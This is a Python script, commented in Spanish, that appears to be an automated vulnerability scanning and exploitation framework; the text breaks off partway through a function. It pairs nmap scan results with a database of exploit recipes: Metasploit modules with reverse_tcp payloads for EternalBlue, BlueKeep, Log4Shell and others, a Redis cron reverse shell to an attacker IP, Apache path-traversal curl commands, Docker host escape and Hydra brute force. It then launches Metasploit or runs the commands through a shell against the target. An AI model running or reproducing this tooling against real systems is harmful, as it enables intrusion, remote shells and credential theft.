#!/usr/bin/env python3
"""
Vulnerability Scanner & Exploitation Framework - Ciberseguridad
================================================================
Menú interactivo con:
  1. Escaneo de vulnerabilidades + recomendación de explotación
  2. Automatización de explotación de vulnerabilidades

ADVERTENCIA: Solo use en sistemas donde tenga autorización explícita.
             Herramienta para pentesting autorizado y auditorías.
"""

import argparse
import subprocess
import sys
import os
import re
import json
from datetime import datetime
from pathlib import Path
from collections import defaultdict


class Colors:
    """Colores para terminal"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'


# ============================================================================
# BASE DE DATOS DE EXPLOITS RECOMENDADOS
# ============================================================================
EXPLOIT_DATABASE = {
    # SMB
    'EternalBlue': {
        'patterns': ['MS17-010', 'EternalBlue', 'SMB.*v1.*vulnerable'],
        'severity': 'CRITICAL',
        'service': 'SMB',
        'port': '445',
        'exploit': {
            'tool': 'metasploit',
            'module': 'exploit/windows/smb/ms17_010_eternalblue',
            'payload': 'windows/x64/meterpreter/reverse_tcp',
            'description': 'Ejecuta código remoto como SYSTEM',
            'manual': 'use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS <target>\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST <tu_ip>\nset LPORT 4444\nexploit'
        }
    },
    'BlueKeep': {
        'patterns': ['MS19-019', 'BlueKeep', 'CVE-2019-0708'],
        'severity': 'CRITICAL',
        'service': 'RDP',
        'port': '3389',
        'exploit': {
            'tool': 'metasploit',
            'module': 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce',
            'payload': 'windows/x64/meterpreter/reverse_tcp',
            'description': 'Ejecución remota de código en RDP sin autenticación',
            'manual': 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS <target>\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST <tu_ip>\nexploit'
        }
    },
    'vsftpd_backdoor': {
        'patterns': ['vsftpd.*2\.3\.4', 'CVE-2011-2523'],
        'severity': 'CRITICAL',
        'service': 'FTP',
        'port': '21',
        'exploit': {
            'tool': 'metasploit',
            'module': 'exploit/unix/ftp/vsftpd_234_backdoor',
            'payload': 'cmd/unix/interact',
            'description': 'Backdoor en vsftpd 2.3.4 - shell inmediata',
            'manual': 'use exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS <target>\nexploit'
        }
    },
    # Apache
    'Apache_RCE': {
        'patterns': ['Apache.*2\.4\.[0-4][0-9]', 'CVE-2021-41773', 'CVE-2021-42013'],
        'severity': 'CRITICAL',
        'service': 'HTTP',
        'port': '80,443',
        'exploit': {
            'tool': 'curl_manual',
            'description': 'Path traversal y RCE en Apache 2.4.49-2.4.50',
            'manual': 'curl -X POST http://<target>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd\ncurl -X POST -d "echo;id" http://<target>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
        }
    },
    'Apache_RCE_2021_40438': {
        'patterns': ['CVE-2021-40438'],
        'severity': 'CRITICAL',
        'service': 'HTTP',
        'port': '80,443',
        'exploit': {
            'tool': 'metasploit',
            'module': 'exploit/multi/http/apache_mod_proxy',
            'payload': 'linux/x64/meterpreter/reverse_tcp',
            'description': 'SSRF a RCE en Apache mod_proxy',
            'manual': 'use exploit/multi/http/apache_mod_proxy\nset RHOSTS <target>\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST <tu_ip>\nexploit'
        }
    },
    # Log4Shell
    'Log4Shell': {
        'patterns': ['CVE-2021-44228', 'Log4Shell', 'log4j.*2\.[0-1][0-4]'],
        'severity': 'CRITICAL',
        'service': 'JAVA',
        'port': 'multiple',
        'exploit': {
            'tool': 'metasploit',
            'module': 'exploit/multi/http/log4shell_header_injection',
            'payload': 'java/jndi/shell',
            'description': 'RCE vía JNDI injection en Log4j',
            'manual': 'use exploit/multi/http/log4shell_header_injection\nset RHOSTS <target>\nset PAYLOAD java/jndi/shell\nset LHOST <tu_ip>\nset SRVPORT 8080\nexploit'
        }
    },
    # Shellshock
    'Shellshock': {
        'patterns': ['CVE-2014-6271', 'Shellshock', 'bash.*vulnerable'],
        'severity': 'CRITICAL',
        'service': 'HTTP/CGI',
        'port': '80,443',
        'exploit': {
            'tool': 'metasploit',
            'module': 'exploit/multi/http/apache_mod_cgi_bash_env_exec',
            'payload': 'linux/x64/meterpreter/reverse_tcp',
            'description': 'Inyección de variables de entorno en Bash',
            'manual': 'use exploit/multi/http/apache_mod_cgi_bash_env_exec\nset RHOSTS <target>\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nset LHOST <tu_ip>\nset TARGETURI /cgi-bin/vulnerable\nexploit'
        }
    },
    # Heartbleed
    'Heartbleed': {
        'patterns': ['CVE-2014-0160', 'Heartbleed', 'OpenSSL.*1\.0\.[0-1]'],
        'severity': 'CRITICAL',
        'service': 'SSL/TLS',
        'port': '443',
        'exploit': {
            'tool': 'metasploit',
            'module': 'auxiliary/scanner/ssl/heartbleed',
            'payload': None,
            'description': 'Fuga de memoria - puede revelar credenciales y claves privadas',
            'manual': 'use auxiliary/scanner/ssl/heartbleed\nset RHOSTS <target>\nrun'
        }
    },
    # POODLE
    'POODLE': {
        'patterns': ['CVE-2014-3566', 'POODLE', 'SSLv3'],
        'severity': 'MEDIUM',
        'service': 'SSL/TLS',
        'port': '443',
        'exploit': {
            'tool': 'python',
            'description': 'Ataque a SSLv3 - decrypt traffic',
            'manual': 'Usar: sslscan <target> o testssl.sh <target>\nLuego: python3 poodle.py <target> (buscar en GitHub)'
        }
    },
    # Redis
    'Redis_Unauth': {
        'patterns': ['Redis.*unauthorized', 'Redis.*no.*auth', 'CVE-2022-0543'],
        'severity': 'HIGH',
        'service': 'Redis',
        'port': '6379',
        'exploit': {
            'tool': 'redis-cli',
            'description': 'Acceso sin autenticación - RCE vía CONFIG SET',
            'manual': 'redis-cli -h <target>\nCONFIG SET dir /var/spool/cron/\nCONFIG SET dbfilename root\nSET payload "\\n\\n*/1 * * * * bash -i >& /dev/tcp/<tu_ip>/4444 0>&1\\n\\n"\nSAVE'
        }
    },
    # MongoDB
    'MongoDB_Unauth': {
        'patterns': ['MongoDB.*no.*auth', 'MongoDB.*unauthorized'],
        'severity': 'HIGH',
        'service': 'MongoDB',
        'port': '27017',
        'exploit': {
            'tool': 'mongo',
            'description': 'Acceso sin autenticación - lectura/escritura completa',
            'manual': 'mongo <target>:27017\nshow dbs\nuse admin\ndb.users.find()'
        }
    },
    # MySQL
    'MySQL_RCE': {
        'patterns': ['MySQL.*5\.7\.[0-6]', 'CVE-2016-6662'],
        'severity': 'CRITICAL',
        'service': 'MySQL',
        'port': '3306',
        'exploit': {
            'tool': 'metasploit',
            'module': 'exploit/linux/mysql/mysql_yassl_getname',
            'payload': 'linux/x64/meterpreter/reverse_tcp',
            'description': 'RCE vía MySQL (CVE-2016-6662)',
            'manual': 'use exploit/linux/mysql/mysql_yassl_getname\nset RHOSTS <target>\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nexploit'
        }
    },
    # ProFTPD
    'ProFTPD_backdoor': {
        'patterns': ['ProFTPD.*1\.3\.[345].*mod_copy'],
        'severity': 'HIGH',
        'service': 'FTP',
        'port': '21',
        'exploit': {
            'tool': 'metasploit',
            'module': 'exploit/linux/proftpd/mod_copy_exec',
            'payload': 'linux/x64/meterpreter/reverse_tcp',
            'description': 'RCE vía mod_copy en ProFTPD',
            'manual': 'use exploit/linux/proftpd/mod_copy_exec\nset RHOSTS <target>\nset PAYLOAD linux/x64/meterpreter/reverse_tcp\nexploit'
        }
    },
    # Docker API
    'Docker_Unauth': {
        'patterns': ['Docker.*API.*unauthorized', 'Docker.*2375'],
        'severity': 'CRITICAL',
        'service': 'Docker',
        'port': '2375',
        'exploit': {
            'tool': 'docker-cli',
            'description': 'Acceso no autorizado a Docker API - escape a host',
            'manual': 'docker -H <target>:2375 run -v /:/host -it alpine chroot /host\n# O crear contenedor privileged\ndocker -H <target>:2375 run --privileged -v /:/host -it alpine chroot /host'
        }
    },
    # Jenkins
    'Jenkins_RCE': {
        'patterns': ['Jenkins.*unauthorized', 'Jenkins.*CLI', 'CVE-2016-0788'],
        'severity': 'HIGH',
        'service': 'Jenkins',
        'port': '8080',
        'exploit': {
            'tool': 'metasploit',
            'module': 'exploit/multi/http/jenkins_cli_deserialization',
            'payload': 'java/jndi/shell',
            'description': 'RCE vía deserialización en Jenkins CLI',
            'manual': 'use exploit/multi/http/jenkins_cli_deserialization\nset RHOSTS <target>\nset PAYLOAD java/jndi/shell\nexploit'
        }
    },
    # Tomcat
    'Tomcat_Manager': {
        'patterns': ['Apache Tomcat.*manager', 'Tomcat.*default'],
        'severity': 'HIGH',
        'service': 'HTTP',
        'port': '8080',
        'exploit': {
            'tool': 'metasploit',
            'module': 'exploit/multi/http/tomcat_mgr_deploy',
            'payload': 'java/jsp/meterpreter',
            'description': 'Deploy de WAR malicioso vía Tomcat Manager',
            'manual': 'use exploit/multi/http/tomcat_mgr_deploy\nset RHOSTS <target>\nset PAYLOAD java/jsp/meterpreter\nset HttpUserPassword <credenciales>\nexploit'
        }
    },
    # NFS
    'NFS_NoRootSquash': {
        'patterns': ['NFS.*no_root_squash', 'NFS.*insecure'],
        'severity': 'HIGH',
        'service': 'NFS',
        'port': '2049',
        'exploit': {
            'tool': 'manual',
            'description': 'Montar NFS y acceder como root',
            'manual': 'showmount -e <target>\nmount -t nfs <target>:/export /mnt\n# Si no_root_squash: acceso root completo'
        }
    },
    # SMB Null Session
    'SMB_Null_Session': {
        'patterns': ['SMB.*NULL.*session', 'anonymous.*login'],
        'severity': 'MEDIUM',
        'service': 'SMB',
        'port': '445',
        'exploit': {
            'tool': 'smbclient',
            'description': 'Acceso anónimo a shares SMB',
            'manual': 'smbclient -L //<target> -U ""\nsmbclient //<target>/<share> -U ""\n# Enumerar: ls, get, put'
        }
    },
    # Weak SSH
    'SSH_Weak': {
        'patterns': ['SSH.*protocol.*1', 'SSH.*weak.*cipher', 'SSH.*-.*root.*login'],
        'severity': 'MEDIUM',
        'service': 'SSH',
        'port': '22',
        'exploit': {
            'tool': 'hydra',
            'description': 'Fuerza bruta a SSH',
            'manual': 'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target>\nhydra -L users.txt -P passwords.txt ssh://<target>'
        }
    },
    # Default Credentials
    'Default_Creds': {
        'patterns': ['default.*password', 'default.*credential', 'admin:admin'],
        'severity': 'HIGH',
        'service': 'multiple',
        'port': 'various',
        'exploit': {
            'tool': 'manual',
            'description': 'Credenciales por defecto',
            'manual': 'Probar combinaciones comunes:\nadmin:admin, root:root, admin:password, admin:1234\nuser:user, test:test, guest:guest'
        }
    },
    # Drupal
    'Drupalgeddon': {
        'patterns': ['Drupal.*7\.[0-2][0-9]', 'CVE-2018-7600', 'Drupalgeddon2'],
        'severity': 'CRITICAL',
        'service': 'HTTP',
        'port': '80,443',
        'exploit': {
            'tool': 'metasploit',
            'module': 'exploit/unix/webapp/drupal_drupalgeddon2',
            'payload': 'php/meterpreter/reverse_tcp',
            'description': 'RCE en Drupal 7.x',
            'manual': 'use exploit/unix/webapp/drupal_drupalgeddon2\nset RHOSTS <target>\nset PAYLOAD php/meterpreter/reverse_tcp\nset LHOST <tu_ip>\nexploit'
        }
    },
    # WordPress
    'WordPress_Vuln': {
        'patterns': ['WordPress.*[0-4]\.[0-9]', 'WordPress.*plugin.*vulnerable'],
        'severity': 'HIGH',
        'service': 'HTTP',
        'port': '80,443',
        'exploit': {
            'tool': 'wpscan',
            'description': 'Enumerar plugins y temas vulnerables',
            'manual': 'wpscan --url http://<target> --enumerate vp,vu,t,u\nwpscan --url http://<target> --plugin-detection aggressive'
        }
    },
}


# ============================================================================
# FUNCIONES DE ESCANEO
# ============================================================================

def banner():
    """Mostrar banner"""
    print(f"""{Colors.RED}{Colors.BOLD}
    ╔══════════════════════════════════════════════════════════╗
    ║     VULNERABILITY SCANNER & EXPLOITATION FRAMEWORK       ║
    ║              Herramienta de Ciberseguridad               ║
    ╚══════════════════════════════════════════════════════════╝
    {Colors.RESET}""")


def check_requirements():
    """Verificar requisitos"""
    issues = []

    try:
        subprocess.run(['nmap', '--version'], capture_output=True, check=True)
    except:
        issues.append("nmap no está instalado")

    # Verificar herramientas opcionales
    tools = {
        'metasploit': 'msfconsole',
        'hydra': 'hydra',
        'wpscan': 'wpscan',
        'docker': 'docker',
        'redis': 'redis-cli'
    }

    available_tools = []
    for name, cmd in tools.items():
        try:
            subprocess.run(['which', cmd], capture_output=True, check=True)
            available_tools.append(name)
        except:
            pass

    return len(issues) == 0, issues, available_tools


def check_root():
    """Verificar privilegios root"""
    if os.geteuid() != 0:
        print(f"{Colors.YELLOW}[!] Ejecute con sudo para escaneo completo{Colors.RESET}\n")
        return False
    return True


def run_nmap_scan(target, ports=None, timeout=600):
    """Ejecutar escaneo de vulnerabilidades"""
    print(f"\n{Colors.CYAN}[*] Iniciando escaneo en: {target}{Colors.RESET}")
    print(f"{Colors.CYAN}[*] Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}\n")

    cmd = [
        'nmap',
        '-sV',
        '-O',
        '--version-intensity', '5',
        '--osscan-guess',
    ]

    if ports:
        cmd.extend(['-p', ports])
    else:
        cmd.extend(['--top-ports', '2000'])

    cmd.extend([
        '--script', 'vuln,exploit,auth,default,safe',
        '--script-args', 'vulns.showall',
        '--reason',
        '--open',
        '-T4',
        target
    ])

    print(f"{Colors.YELLOW}[*] Comando: {' '.join(cmd)}{Colors.RESET}\n")
    print(f"{Colors.BLUE}{'─'*70}{Colors.RESET}")

    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return f"[TIMEOUT] El escaneo excedió los {timeout} segundos"
    except Exception as e:
        return f"[ERROR] {str(e)}"


def parse_and_match_vulnerabilities(scan_output):
    """
    Extraer vulnerabilidades y MATCH con base de datos de exploits.
    Retorna vulnerabilidades con recomendación de explotación.
    """
    results = []
    current_host = None
    current_port = None
    current_service = None

    lines = scan_output.split('\n')

    for i, line in enumerate(lines):
        # Detectar host
        if 'Nmap scan report for' in line:
            current_host = line.split('for ')[1].strip()
            continue

        # Detectar puerto/servicio
        port_match = re.match(r'^(\d+)/(\w+)\s+(\w+)\s+(.*)$', line.strip())
        if port_match:
            port_num = port_match.group(1)
            protocol = port_match.group(2)
            state = port_match.group(3)
            service_info = port_match.group(4)

            if state == 'open':
                current_port = f"{port_num}/{protocol}"
                current_service = service_info

        # Buscar vulnerabilidades
        if 'VULNERABLE' in line or 'CVE-' in line:
            vuln_entry = {
                'host': current_host,
                'port': current_port,
                'service': current_service,
                'vulnerability': line.strip(),
                'cve': None,
                'severity': 'UNKNOWN',
                'exploit_recommendation': None,
                'exploit_details': None
            }

            # Extraer CVE
            cve_match = re.search(r'(CVE-\d{4}-\d{4,})', line)
            if cve_match:
                vuln_entry['cve'] = cve_match.group(1)

            # MATCH con base de datos de exploits
            matched_exploit = None
            for exploit_name, exploit_data in EXPLOIT_DATABASE.items():
                for pattern in exploit_data['patterns']:
                    if re.search(pattern, line, re.IGNORECASE):
                        matched_exploit = exploit_data
                        vuln_entry['severity'] = exploit_data['severity']
                        vuln_entry['exploit_recommendation'] = exploit_name
                        vuln_entry['exploit_details'] = exploit_data['exploit']
                        break
                if matched_exploit:
                    break

            # Si no hay match directo, intentar con CVE
            if not matched_exploit and vuln_entry['cve']:
                for exploit_name, exploit_data in EXPLOIT_DATABASE.items():
                    if exploit_data.get('cve') == vuln_entry['cve']:
                        matched_exploit = exploit_data
                        vuln_entry['exploit_recommendation'] = exploit_name
                        vuln_entry['exploit_details'] = exploit_data['exploit']
                        break

            # Determinar severidad si no se encontró
            if vuln_entry['severity'] == 'UNKNOWN':
                line_lower = line.lower()
                if 'critical' in line_lower or 'remote code' in line_lower:
                    vuln_entry['severity'] = 'CRITICAL'
                elif 'high' in line_lower:
                    vuln_entry['severity'] = 'HIGH'
                elif 'medium' in line_lower:
                    vuln_entry['severity'] = 'MEDIUM'
                else:
                    vuln_entry['severity'] = 'LOW'

            results.append(vuln_entry)

    # Búsqueda adicional por servicio/version
    service_matches = check_service_vulnerabilities(scan_output)
    for match in service_matches:
        if not any(m['vulnerability'] == match['vulnerability'] for m in results):
            results.append(match)

    return results


def check_service_vulnerabilities(scan_output):
    """Verificar servicios contra base de datos de exploits"""
    matches = []

    for exploit_name, exploit_data in EXPLOIT_DATABASE.items():
        for pattern in exploit_data['patterns']:
            if re.search(pattern, scan_output, re.IGNORECASE):
                match = {
                    'host': 'multiple',
                    'port': exploit_data['port'],
                    'service': exploit_data['service'],
                    'vulnerability': f"{exploit_name} detectado",
                    'cve': None,
                    'severity': exploit_data['severity'],
                    'exploit_recommendation': exploit_name,
                    'exploit_details': exploit_data['exploit']
                }

                # Intentar extraer CVE si existe
                for p in exploit_data['patterns']:
                    if 'CVE-' in p:
                        cve_match = re.search(r'(CVE-\d{4}-\d{4,})', p)
                        if cve_match:
                            match['cve'] = cve_match.group(1)
                        break

                matches.append(match)
                break

    return matches


def display_vulnerability_report(vulnerabilities, target, output_dir=None):
    """Mostrar reporte SOLO con vulnerabilidades y exploits recomendados"""

    if not vulnerabilities:
        print(f"\n{Colors.GREEN}{Colors.BOLD}✓ No se detectaron vulnerabilidades explotables{Colors.RESET}")
        print(f"{Colors.GREEN}  El sistema parece estar actualizado y configurado de forma segura.{Colors.RESET}\n")
        return 0

    # Contar por severidad
    severity_count = defaultdict(int)
    for v in vulnerabilities:
        severity_count[v['severity']] += 1

    total = sum(severity_count.values())

    # Header
    print(f"\n{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}  REPORTE DE VULNERABILIDADES - {target.upper()}{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}")

    print(f"\n{Colors.WHITE}Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
    print(f"{Colors.WHITE}Objetivo: {target}{Colors.RESET}")

    # Resumen
    print(f"\n{Colors.YELLOW}{Colors.BOLD}┌{'─'*68}┐{Colors.RESET}")
    print(f"{Colors.YELLOW}{Colors.BOLD}│  VULNERABILIDADES EXPLOTABLES DETECTADAS{Colors.RESET}{' '*(68-41)}{Colors.YELLOW}{Colors.BOLD}│{Colors.RESET}")
    print(f"{Colors.YELLOW}{Colors.BOLD}├{'─'*68}┤{Colors.RESET}")

    for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
        count = severity_count.get(sev, 0)
        if count > 0:
            color = {'CRITICAL': Colors.RED, 'HIGH': Colors.YELLOW,
                     'MEDIUM': Colors.CYAN, 'LOW': Colors.BLUE}.get(sev, Colors.WHITE)
            print(f"{Colors.YELLOW}{Colors.BOLD}│{Colors.RESET}  {color}{Colors.BOLD}{sev}:{Colors.RESET} {count}{' '*(60-len(str(count)))}{Colors.YELLOW}{Colors.BOLD}│{Colors.RESET}")

    print(f"{Colors.YELLOW}{Colors.BOLD}├{'─'*68}┤{Colors.RESET}")
    print(f"{Colors.YELLOW}{Colors.BOLD}│{Colors.RESET}  {Colors.BOLD}TOTAL:{Colors.RESET} {total}{' '*(61-len(str(total)))}{Colors.YELLOW}{Colors.BOLD}│{Colors.RESET}")
    print(f"{Colors.YELLOW}{Colors.BOLD}└{'─'*68}┘{Colors.RESET}")

    # Vulnerabilidades detalladas
    print(f"\n{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}  VULNERABILIDADES Y EXPLOTS RECOMENDADOS{Colors.RESET}")
    print(f"{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}\n")

    # Ordenar por severidad
    sorted_vulns = sorted(vulnerabilities,
                         key=lambda x: {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}.get(x['severity'], 4))

    for i, vuln in enumerate(sorted_vulns, 1):
        sev_color = {'CRITICAL': Colors.RED, 'HIGH': Colors.YELLOW,
                     'MEDIUM': Colors.CYAN, 'LOW': Colors.BLUE}.get(vuln['severity'], Colors.WHITE)

        print(f"{Colors.RED}{Colors.BOLD}[#{i}]{Colors.RESET} {sev_color}{Colors.BOLD}{vuln['severity']}{Colors.RESET}")
        print(f"    {Colors.WHITE}Host:{Colors.RESET} {vuln['host'] or 'N/A'}")
        print(f"    {Colors.WHITE}Puerto:{Colors.RESET} {vuln['port'] or 'N/A'}")
        print(f"    {Colors.WHITE}Servicio:{Colors.RESET} {vuln['service'] or 'N/A'}")
        print(f"    {Colors.WHITE}Vulnerabilidad:{Colors.RESET} {vuln['vulnerability']}")

        if vuln['cve']:
            print(f"    {Colors.MAGENTA}CVE: {vuln['cve']}{Colors.RESET}")

        # Mostrar recomendación de exploit
        if vuln['exploit_recommendation']:
            print(f"\n    {Colors.GREEN}{Colors.BOLD}► EXPLOIT RECOMENDADO: {vuln['exploit_recommendation']}{Colors.RESET}")

            if vuln['exploit_details']:
                details = vuln['exploit_details']
                print(f"    {Colors.CYAN}Herramienta:{Colors.RESET} {details['tool'].upper()}")
                print(f"    {Colors.CYAN}Descripción:{Colors.RESET} {details['description']}")

                if details.get('module'):
                    print(f"    {Colors.CYAN}Módulo:{Colors.RESET} {details['module']}")

                if details.get('payload'):
                    print(f"    {Colors.CYAN}Payload:{Colors.RESET} {details['payload']}")

                print(f"\n    {Colors.YELLOW}{Colors.BOLD}    COMANDO/EJEMPLO:{Colors.RESET}")
                print(f"    {Colors.YELLOW}{'─'*60}{Colors.RESET}")
                for cmd_line in details['manual'].split('\n'):
                    print(f"    {Colors.WHITE}{cmd_line}{Colors.RESET}")
                print(f"    {Colors.YELLOW}{'─'*60}{Colors.RESET}")

        print()

    # Guardar reporte
    if output_dir:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_path = Path(output_dir)
        output_path.mkdir(parents=True, exist_ok=True)

        txt_file = output_path / f"vuln_exploit_{target.replace('/', '_')}_{timestamp}.txt"

        # Versión limpia para archivo
        clean_lines = []
        clean_lines.append(f"REPORTE DE VULNERABILIDADES - {target.upper()}")
        clean_lines.append(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        clean_lines.append(f"Total vulnerabilidades: {total}")
        clean_lines.append("")

        for v in sorted_vulns:
            clean_lines.append(f"[{v['severity']}] {v['vulnerability']}")
            clean_lines.append(f"  Host: {v['host']}, Puerto: {v['port']}, Servicio: {v['service']}")
            if v['cve']:
                clean_lines.append(f"  CVE: {v['cve']}")
            if v['exploit_recommendation']:
                clean_lines.append(f"  EXPLOIT: {v['exploit_recommendation']}")
                if v['exploit_details']:
                    clean_lines.append(f"  Tool: {v['exploit_details']['tool']}")
                    clean_lines.append(f"  Module: {v['exploit_details'].get('module', 'N/A')}")
            clean_lines.append("")

        with open(txt_file, 'w') as f:
            f.write('\n'.join(clean_lines))

        print(f"{Colors.GREEN}[+] Reporte guardado en: {txt_file}{Colors.RESET}")

    return total


# ============================================================================
# MÓDULO DE EXPLOTACIÓN AUTOMATIZADA
# ============================================================================

def select_target_and_exploit(vulnerabilities):
    """Seleccionar objetivo y exploit para explotación"""

    if not vulnerabilities:
        print(f"\n{Colors.YELLOW}[!] No hay vulnerabilidades para explotar{Colors.RESET}")
        return None, None

    print(f"\n{Colors.CYAN}{Colors.BOLD}Seleccione una vulnerabilidad para explotar:{Colors.RESET}\n")

    for i, vuln in enumerate(vulnerabilities, 1):
        if vuln['exploit_recommendation']:
            sev_color = {'CRITICAL': Colors.RED, 'HIGH': Colors.YELLOW,
                         'MEDIUM': Colors.CYAN, 'LOW': Colors.BLUE}.get(vuln['severity'], Colors.WHITE)
            print(f"  {Colors.BOLD}[{i}]{Colors.RESET} {sev_color}{vuln['severity']}{Colors.RESET} - "
                  f"{vuln['exploit_recommendation']} @ {vuln['host']}:{vuln['port']}")

    print(f"\n  {Colors.BOLD}[0]{Colors.RESET} Cancelar")

    try:
        choice = input(f"\n{Colors.YELLOW}[?] Seleccione número: {Colors.RESET}").strip()
        if choice == '0':
            return None, None

        idx = int(choice) - 1
        if 0 <= idx < len(vulnerabilities):
            selected = vulnerabilities[idx]
            if selected['exploit_recommendation']:
                return selected, selected['exploit_details']
            else:
                print(f"{Colors.RED}[!] Esta vulnerabilidad no tiene exploit automático{Colors.RESET}")
                return None, None
    except ValueError:
        return None, None

    return None, None


def run_metasploit_exploit(target, exploit_details, vuln_info):
    """Ejecutar exploit mediante Metasploit"""

    module = exploit_details.get('module')
    payload = exploit_details.get('payload')

    if not module:
        print(f"{Colors.RED}[!] Módulo no especificado{Colors.RESET}")
        return False

    print(f"\n{Colors.GREEN}{Colors.BOLD}[*] Preparando exploit con Metasploit{Colors.RESET}")
    print(f"    Módulo: {module}")
    print(f"    Payload: {payload or 'N/A'}")
    print(f"    Objetivo: {target}")

    # Verificar si msfconsole está disponible
    try:
        subprocess.run(['which', 'msfconsole'], capture_output=True, check=True)
    except:
        print(f"\n{Colors.YELLOW}[!] Metasploit no está instalado{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Comando manual para ejecutar:{Colors.RESET}")
        print(f"\n    msfconsole")
        print(f"    use {module}")
        print(f"    set RHOSTS {target}")
        if payload:
            print(f"    set PAYLOAD {payload}")
            print(f"    set LHOST <tu_ip>")
        print(f"    exploit\n")
        return False

    # Crear script de Metasploit
    rc_content = f"""
use {module}
set RHOSTS {target}
set VERBOSE true
"""
    if payload:
        rc_content += f"set PAYLOAD {payload}\n"
        rc_content += "set LHOST {{tu_ip}}\n"
        rc_content += "set LPORT 4444\n"

    rc_content += "exploit\n"

    # Mostrar comando
    print(f"\n{Colors.YELLOW}[!] Metasploit requiere configuración de LHOST{Colors.RESET}")
    print(f"{Colors.CYAN}[*] Opciones:{Colors.RESET}")
    print(f"  1. Generar script .rc para ejecutar manualmente")
    print(f"  2. Intentar ejecución automática (requiere LHOST)")

    choice = input(f"\n{Colors.YELLOW}[?] Seleccione opción: {Colors.RESET}").strip()

    if choice == '1':
        rc_file = f"/tmp/msf_{module.replace('/', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.rc"
        with open(rc_file, 'w') as f:
            f.write(rc_content)
        print(f"\n{Colors.GREEN}[+] Script generado: {rc_file}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Ejecute: msfconsole -r {rc_file}{Colors.RESET}")
        return True
    else:
        lhost = input(f"{Colors.YELLOW}[?] Ingresa tu LHOST (IP local): {Colors.RESET}").strip()
        rc_content = rc_content.replace('{{tu_ip}}', lhost)

        rc_file = f"/tmp/msf_auto_{datetime.now().strftime('%Y%m%d_%H%M%S')}.rc"
        with open(rc_file, 'w') as f:
            f.write(rc_content)

        print(f"\n{Colors.GREEN}[*] Iniciando Metasploit...{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Presiona Ctrl+C para salir{Colors.RESET}\n")

        try:
            subprocess.run(['msfconsole', '-r', rc_file])
            return True
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Metasploit interrumpido{Colors.RESET}")
            return False


def run_manual_exploit(target, exploit_details, vuln_info):
    """Mostrar instrucciones para exploit manual"""

    tool = exploit_details.get('tool', 'manual')
    manual = exploit_details.get('manual', 'No hay instrucciones disponibles')

    print(f"\n{Colors.CYAN}{Colors.BOLD}{'='*70}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}  INSTRUCCIONES DE EXPLOTACIÓN - {tool.upper()}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}{'='*70}{Colors.RESET}\n")

    print(f"{Colors.WHITE}Objetivo: {target}{Colors.RESET}")
    print(f"{Colors.WHITE}Vulnerabilidad: {vuln_info.get('vulnerability', 'N/A')}{Colors.RESET}")
    if vuln_info.get('cve'):
        print(f"{Colors.WHITE}CVE: {vuln_info['cve']}{Colors.RESET}")

    print(f"\n{Colors.YELLOW}{Colors.BOLD}COMANDOS A EJECUTAR:{Colors.RESET}\n")

    # Reemplazar placeholders
    commands = manual.replace('<target>', f'{Colors.RED}<{target}>{Colors.RESET}')
    commands = commands.replace('<tu_ip>', f'{Colors.GREEN}<TU_IP>{Colors.RESET}')
    commands = commands.replace('<credenciales>', f'{Colors.YELLOW}<CREDENCIALES>{Colors.RESET}')

    print(commands)

    print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")

    # Preguntar si quiere ejecutar automáticamente
    if tool not in ['metasploit']:
        auto = input(f"\n{Colors.YELLOW}[?] ¿Ejecutar comandos automáticamente? (s/n): {Colors.RESET}").strip().lower()

        if auto == 's':
            print(f"\n{Colors.YELLOW}[!] Advertencia: Esto ejecutará comandos en el objetivo{Colors.RESET}")
            confirm = input(f"{Colors.RED}[?] ¿Confirmar? (yes/no): {Colors.RESET}").strip().lower()

            if confirm == 'yes':
                # Ejecutar comandos (simplificado)
                for line in manual.split('\n'):
                    clean_cmd = line.strip()
                    if clean_cmd and not clean_cmd.startswith('#'):
                        # Reemplazar placeholders con valores reales
                        clean_cmd = clean_cmd.replace('<target>', target)
                        clean_cmd = clean_cmd.replace('<tu_ip>', '127.0.0.1')
                        print(f"\n{Colors.CYAN}[*] Ejecutando: {clean_cmd}{Colors.RESET}")
                        try:
                            result = subprocess.run(clean_cmd, shell=True, capture_output=True, text=True, timeout=30)
                            if result.stdout:
